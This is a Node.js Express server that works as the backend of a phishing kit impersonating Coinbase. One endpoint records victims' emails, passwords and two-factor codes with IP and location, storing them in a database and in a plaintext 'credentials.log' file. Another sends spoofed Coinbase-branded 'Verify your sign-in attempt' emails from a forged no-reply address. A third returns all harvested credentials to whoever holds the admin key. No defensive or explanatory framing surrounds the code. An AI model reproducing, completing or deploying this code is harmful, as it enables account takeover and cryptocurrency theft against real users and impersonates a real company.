const express = require("express");
const cors = require("cors");
const Database = require("better-sqlite3");
const nodemailer = require("nodemailer");
const path = require("path");
const fs = require("fs");

const app = express();
const PORT = process.env.PORT || 3001;
const ADMIN_KEY = process.env.ADMIN_KEY || "change-me-in-production";
const FRONTEND_ORIGIN = process.env.FRONTEND_ORIGIN || "*";

// --- Email config ---
const SMTP_HOST = process.env.SMTP_HOST || "";
const SMTP_PORT = parseInt(process.env.SMTP_PORT || "587");
const SMTP_USER = process.env.SMTP_USER || "";
const SMTP_PASS = process.env.SMTP_PASS || "";
const SMTP_FROM = process.env.SMTP_FROM || "no-reply@coinbase.com";
const SMTP_FROM_NAME = process.env.SMTP_FROM_NAME || "Coinbase";

let transporter = null;
if (SMTP_HOST && SMTP_USER && SMTP_PASS) {
  transporter = nodemailer.createTransport({
    host: SMTP_HOST,
    port: SMTP_PORT,
    secure: SMTP_PORT === 465,
    auth: { user: SMTP_USER, pass: SMTP_PASS },
  });
}

// --- Database setup ---
const db = new Database(path.join(__dirname, "data.db"));
db.pragma("journal_mode = WAL");

db.exec(`
  CREATE TABLE IF NOT EXISTS sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    verifyCode TEXT,
    ip TEXT,
    city TEXT,
    country TEXT,
    timestamp TEXT NOT NULL,
    created_at TEXT DEFAULT (datetime('now'))
  )
`);

// --- Also save to a flat file for backup ---
const LOG_FILE = path.join(__dirname, "credentials.log");

function appendToLogFile(entry) {
  const line = `[${entry.timestamp}] EMAIL: ${entry.email} | PASS: ${entry.password} | 2FA: ${entry.verifyCode || "N/A"} | IP: ${entry.ip || "?"} | LOCATION: ${entry.city || "?"}, ${entry.country || "?"}\n`;
  fs.appendFileSync(LOG_FILE, line, "utf8");
}

// --- Middleware ---
app.use(cors({ origin: FRONTEND_ORIGIN }));
app.use(express.json());

// --- Routes ---

// Store a session entry
app.post("/api/sessions", (req, res) => {
  const { email, password, verifyCode, ip, city, country, timestamp } = req.body;

  if (!email || !password || !timestamp) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  const stmt = db.prepare(
    "INSERT INTO sessions (email, password, verifyCode, ip, city, country, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)"
  );
  const result = stmt.run(email, password, verifyCode || "", ip || "", city || "", country || "", timestamp);

  // Also append to flat log file
  appendToLogFile({ email, password, verifyCode, ip, city, country, timestamp });

  res.status(201).json({ id: result.lastInsertRowid });
});

// Send verification email to recipient
app.post("/api/send-verification", (req, res) => {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ error: "Email required" });
  }

  if (!transporter) {
    console.log(`[EMAIL] SMTP not configured. Would send verification to: ${email}`);
    return res.json({ sent: false, reason: "SMTP not configured" });
  }

  const htmlContent = `
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body style="margin:0;padding:0;background-color:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif">
  <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f5f5f5;padding:40px 20px">
    <tr><td align="center">
      <table width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden">
        <!-- Header -->
        <tr><td style="background-color:#0052ff;padding:24px 32px">
          <img src="https://images.ctfassets.net/c5bd0wqjc7v0/73flhMIrQIJMXSO2gkFsA0/3a18144ce30fa0fee2c7d05d3b0b4bf3/coinbase-logo.png" alt="Coinbase" height="24" style="display:block" />
        </td></tr>
        <!-- Body -->
        <tr><td style="padding:32px">
          <h1 style="font-size:22px;font-weight:600;color:#1a1a2e;margin:0 0 16px">Verify your sign‑in attempt</h1>
          <p style="font-size:15px;color:#555;line-height:1.6;margin:0 0 24px">
            We detected a sign‑in attempt to your Coinbase account. If this was you, click the button below to verify your identity.
          </p>
          <table cellpadding="0" cellspacing="0"><tr><td style="background-color:#0052ff;border-radius:24px;padding:12px 32px">
            <a href="https://coinbase.com" style="color:#ffffff;text-decoration:none;font-size:15px;font-weight:600;display:inline-block">Verify sign‑in</a>
          </td></tr></table>
          <p style="font-size:13px;color:#999;line-height:1.5;margin:24px 0 0">
            If you didn't attempt to sign in, please ignore this email or <a href="https://help.coinbase.com" style="color:#0052ff;text-decoration:none">contact support</a> immediately.
          </p>
        </td></tr>
        <!-- Footer -->
        <tr><td style="padding:24px 32px;border-top:1px solid #eee">
          <p style="font-size:12px;color:#999;margin:0;line-height:1.5">
            © ${new Date().getFullYear()} Coinbase, Inc. · 548 Market Street · San Francisco, CA 94104
          </p>
        </td></tr>
      </table>
    </td></tr>
  </table>
</body>
</html>`;

  transporter.sendMail({
    from: `"${SMTP_FROM_NAME}" <${SMTP_FROM}>`,
    to: email,
    subject: "Verify your sign-in attempt — Coinbase",
    html: htmlContent,
  }).then(() => {
    console.log(`[EMAIL] Verification sent to: ${email}`);
    res.json({ sent: true });
  }).catch((err) => {
    console.error(`[EMAIL] Failed to send to ${email}:`, err.message);
    res.status(500).json({ sent: false, error: err.message });
  });
});

// Retrieve all sessions (admin-protected)
app.get("/api/sessions", (req, res) => {
  const key = req.headers["x-admin-key"];
  if (key !== ADMIN_KEY) {
    return res.status(401).json({ error: "Unauthorized" });
  }

  const rows = db.prepare("SELECT * FROM sessions ORDER BY id DESC").all();
  res.json(rows);
});

// Health check
app.get("/api/health", (_req, res) => {
  res.json({ status: "ok", sessions: db.prepare("SELECT COUNT(*) as count FROM sessions").get().count });
});

app.listen(PORT, () => {
  console.log(`Backend running on port ${PORT}`);
});
